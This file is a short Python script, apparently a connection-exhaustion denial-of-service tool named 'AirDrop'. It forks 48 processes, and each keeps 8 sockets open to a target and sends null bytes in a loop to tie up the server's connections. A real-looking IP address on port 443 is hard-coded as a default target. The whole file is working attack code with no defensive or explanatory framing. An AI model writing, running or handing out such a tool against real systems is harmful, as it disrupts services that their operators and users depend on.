import socket
import sys
import time
import signal
import os

CONNECTIONS = 8
THREADS = 48

host = "35.173.69.207"
port = '443'

def make_socket(host, port):
    for res in socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
        af, socktype, proto, canonname, sa = res
        try:
            sock = socket.socket(af, socktype, proto)
        except OSError:
            continue
        try:
            sock.connect(sa)
        except OSError:
            sock.close()
            continue
        print(f"[Connected -> {host}:{port}]", file=sys.stderr)
        return sock
    print("No connection could be made", file=sys.stderr)
    sys.exit(0)

def broke(signum, frame):
    # Nothing to do
    pass

def attack(host, port, _id):
    sockets = [None] * CONNECTIONS
    signal.signal(signal.SIGPIPE, broke)
    while True:
        for x in range(CONNECTIONS):
            if sockets[x] is None:
                sockets[x] = make_socket(host, port)
            try:
                sockets[x].send(b"\0")
            except (BrokenPipeError, ConnectionResetError):
                sockets[x].close()
                sockets[x] = make_socket(host, port)
        time.sleep(0.3)

def main():
    if len(sys.argv) < 3:
        print("Usage: ./AirDrop <ip-address> <port>")
        sys.exit(-1)

    host = sys.argv[1]
    port = sys.argv[2]

    for x in range(THREADS):
        pid = os.fork()
        if pid == 0:
            attack(host, port, x)
            sys.exit(0)
        time.sleep(0.2)

    input()

if __name__ == "__main__":
    main()